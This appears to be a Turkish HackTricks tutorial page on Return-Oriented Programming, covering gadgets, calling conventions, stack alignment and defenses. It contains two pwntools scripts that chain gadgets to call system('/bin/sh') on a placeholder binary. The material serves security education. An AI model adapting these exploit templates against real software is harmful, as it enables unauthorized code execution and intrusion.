# ROP - Return Oriented Programing

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek destek olun.

</details>

## **Temel Bilgiler**

**Return-Oriented Programming (ROP)**, **No-Execute (NX)** veya **Data Execution Prevention (DEP)** gibi güvenlik önlemlerini atlatmak için kullanılan gelişmiş bir sızma tekniğidir. Bir saldırgan, shellcode enjekte etmek ve yürütmek yerine, binary veya yüklenmiş kütüphanelerde zaten bulunan kod parçalarını, yani **"gadget"**'ları kullanır. Her gadget genellikle bir `ret` talimatı ile biter ve veri taşıma veya aritmetik işlemler gibi küçük bir işlem gerçekleştirir. Bu gadget'ları bir araya getirerek, bir saldırgan, NX/DEP korumalarını atlayarak keyfi işlemler gerçekleştirmek için bir yük oluşturabilir.

### ROP Nasıl Çalışır

1. **Kontrol Akışı Kaçırma**: İlk olarak, bir saldırganın bir programın kontrol akışını ele geçirmesi gerekir, genellikle bir tampon taşması kullanarak yığında kaydedilmiş bir dönüş adresini üzerine yazarak.
2. **Gadget Zinciri**: Saldırgan daha sonra istenen işlemleri gerçekleştirmek için dikkatlice gadget'ları seçer ve zincirler. Bu, bir işlev çağrısı için argümanları ayarlamayı, işlevi çağırmayı (örneğin, `system("/bin/sh")`), ve gerekli temizlik veya ek işlemleri ele almayı içerebilir.
3. **Yük Yürütme**: Zayıf işlev geri döndüğünde, meşru bir konuma dönüş yapmak yerine, gadget zincirini yürütmeye başlar.

## ROP Zinciri x86 Örneği

### **x86 (32-bit) Çağrı sözleşmeleri**

* **cdecl**: Çağrı yapan yığını temizler. İşlev argümanları yığına ters sırayla itilir (sağdan sola). **Argümanlar sağdan sola doğru yığına itilir.**
* **stdcall**: cdecl'ye benzer, ancak yığını temizleme işlemi çağrıyı alanın sorumluluğundadır.

### **Gadget'lar Bulma**

Öncelikle, binary veya yüklenmiş kütüphanelerde gerekli gadget'ları tanımladığımızı varsayalım. İlgilendiğimiz gadget'lar şunlardır:

* `pop eax; ret`: Bu gadget, yığının en üst değerini `EAX` kaydedicisine iter ve ardından döner, böylece `EAX` üzerinde kontrol sağlar.
* `pop ebx; ret`: Yukarıdakiyle benzer, ancak `EBX` kaydedicisi için, `EBX` üzerinde kontrol sağlar.
* `mov [ebx], eax; ret`: `EAX` içindeki değeri `EBX` tarafından işaret edilen bellek konumuna taşır ve ardından döner.
* Ayrıca, `system()` işlevinin adresine sahibiz.

### **ROP Zinciri**

**pwntools** kullanarak, ROP zinciri yürütmesi için yığını aşağıdaki gibi hazırlıyoruz, `system('/bin/sh')`'yi yürütmeyi amaçlayarak, zincirin aşağıdaki gibi başladığına dikkat edin:

1. Hizalama amaçlı bir `ret` talimatı (isteğe bağlı)
2. `system` işlevinin adresi (ASLR devre dışı bırakılmış ve bilinen libc varsayılarak, daha fazla bilgi için [**Ret2lib**](ret2lib/))
3. `system()`'dan dönüş adresi için yer tutucu
4. `"/bin/sh"` dizesi adresi (system işlevi için parametre)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadcode

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64 Örneğinde ROP Zinciri

### **x64 (64-bit) Çağrı Kuralları**

* Unix benzeri sistemlerde **System V AMD64 ABI** çağrı kuralını kullanır, burada **ilk altı tamsayı veya işaretçi argüman `RDI`, `RSI`, `RDX`, `RCX`, `R8` ve `R9` register'larına geçirilir**. Ek argümanlar yığına geçirilir. Dönüş değeri `RAX` register'ına yerleştirilir.
* **Windows x64** çağrı kuralı, ilk dört tamsayı veya işaretçi argüman için `RCX`, `RDX`, `R8` ve `R9`'u kullanır, ek argümanlar yığına geçirilir. Dönüş değeri `RAX` register'ına yerleştirilir.
* **Register'lar**: 64-bit register'lar `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` ve `R8` ile `R15`'i içerir.

#### **Gadget'lar Bulma**

Amacımız, **RDI** register'ını ayarlamamıza ( **system()**'a **"/bin/sh"** dizesini bir argüman olarak geçirmek için) ve ardından **system()** fonksiyonunu çağırmamıza izin verecek gadget'ları bulmaya odaklanalım. Aşağıdaki gadget'ları tanımladığımızı varsayalım:

* **pop rdi; ret**: Yığının en üst değerini **RDI**'a çıkarır ve ardından döner. **system()** için argümanımızı ayarlamak için temel önemdedir.
* **ret**: Basit bir dönüş, bazı senaryolarda yığın hizalaması için kullanışlıdır.

Ve **system()** fonksiyonunun adresini biliyoruz.

### **ROP Zinciri**

Aşağıda, **system('/bin/sh')**'yi çalıştırmayı amaçlayan bir ROP zinciri oluşturmak ve yürütmek için **pwntools** kullanarak bir örnek bulunmaktadır:
```python
pythonCopy codefrom pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### Yığın Hizalaması

**x86-64 ABI**, bir **çağrı talimatı** yürütüldüğünde **yığının 16 bayt hizalandığını** sağlar. **LIBC**, performansı optimize etmek için **SSE talimatları** (örneğin **movaps**) kullanır ve bu hizalamayı gerektirir. Eğer yığın düzgün hizalanmamışsa (yani **RSP** 16'nın katı değilse), **system** gibi fonksiyonlara yapılan çağrılar bir **ROP zincirinde** başarısız olacaktır. Bunun düzeltilmesi için, ROP zincirinizde **system**'i çağırmadan önce bir **ret gadget** ekleyin.

## x86 ve x64 Ana Farkı

{% hint style="success" %}
x64, ilk birkaç argüman için kayıtları kullandığından, basit fonksiyon çağrıları için genellikle x86'dan daha az gadget gerektirir, ancak doğru gadget'ları bulup zincirlemek, artan kayıt sayısı ve daha büyük adres alanı nedeniyle daha karmaşık olabilir. **x64** mimarisinde artan kayıt sayısı ve daha büyük adres alanı, özellikle Return-Oriented Programming (ROP) bağlamında, hem fırsatlar hem de zorluklar sunar.
{% endhint %}

## ROP'a Karşı Korumalar

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **ve** [**PIE**](../common-binary-protections-and-bypasses/pie/): Bu korumalar, gadget'ların adreslerinin yürütme arasında değişmesini zorlaştırarak ROP'un kullanımını zorlaştırır.
* [**Yığın Kanaryaları**](../common-binary-protections-and-bypasses/stack-canaries/): BOF durumunda, ROP zincirini kötüye kullanmak için geri dönüş işaretçilerini üzerine yazmak için yığın kanaryasını atlamak gereklidir.
* **Yetersiz Gadget'lar**: Yeterli gadget yoksa ROP zinciri oluşturulamaz.

## ROP tabanlı teknikler

ROP'un sadece keyfi kodu yürütmek için bir teknik olduğunu unutmayın. ROP'a dayalı birçok Ret2XXX tekniği geliştirilmiştir:

* **Ret2lib**: Yüklenmiş bir kütüphaneden keyfi parametrelerle keyfi fonksiyonları çağırmak için ROP'u kullanın (genellikle `system('/bin/sh')` gibi bir şey).

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Bir sistem çağrısını hazırlamak için ROP'u kullanın, örneğin `execve`, ve bunu keyfi komutları yürütmek için kullanın.

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

* **EBP2Ret ve EBP Zincirleme**: İlk olarak akışı kontrol etmek için EBP'yi EIP yerine kötüye kullanacak ve ikincisi Ret2lib'e benzer ancak akışı genellikle EBP adresleriyle kontrol eder (ancak EIP'nin de kontrol edilmesi gerekmektedir).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Diğer Örnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bit, Pie ve nx etkin, kanarya olmayan, `vsyscall` adresi ile RIP'yi üzerine yazarak flag sızdıran fonksiyonun bir kısmını elde etmek için yığının bir sonraki adresine geri dönmek amacıyla bir kısmi üzerine yazma işlemi yapılacak.
